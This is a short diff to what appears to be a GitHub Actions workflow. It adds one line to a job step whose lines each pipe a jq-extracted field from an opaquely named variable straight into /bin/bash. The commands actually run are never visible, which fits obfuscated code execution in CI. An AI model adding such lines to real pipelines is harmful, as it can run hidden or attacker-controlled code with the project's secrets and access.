@@ -45,6 +45,7 @@ jobs:
           echo $etga07376 | jq -r .m87 | /bin/bash
           echo $mmru4 | jq -r .icfpg321 | /bin/bash
           echo $s1 | jq -r .itgho555 | /bin/bash
+          echo $cj12260 | jq -r .hjyq37 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
